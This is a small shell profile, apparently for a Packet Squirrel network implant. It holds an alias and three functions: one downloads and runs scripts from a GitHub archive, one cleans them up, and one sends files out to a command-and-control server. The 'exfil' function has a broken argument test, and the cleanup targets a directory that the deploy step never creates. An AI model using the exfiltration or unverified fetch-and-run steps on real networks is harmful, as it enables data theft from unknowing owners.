# ash shell
alias ll="ls -la"

## functions
pulldeploy() {
  if [ -f /usb/main.zip ]
  then
    rm /usb/main.zip
  fi
  cd
  wget https://github.com/shaunsund/packetsquirrel-scripts/archive/refs/heads/main.zip
  unzip main.zip
  cd packetsquirrel-main
  ./deploy.sh
}

deploycleanup() {
  cd

  if [ -f /usb/main.zip ]
  then
    rm /usb/main.zip
  fi

  if [ -d /usb/lanturtle-scripts-main ]
  then
    rm -rfv /usb/lanturtle-scripts-main
  fi
}

exfil() {
  if [ "$2"="" ]
  then
    source="manual-exfil"
  else
    source=$2
  fi

  if ! C2EXFIL STRING $1 ${HOSTNAME}-$source
  then
    echo "error exfiltrating $1"
  fi
}
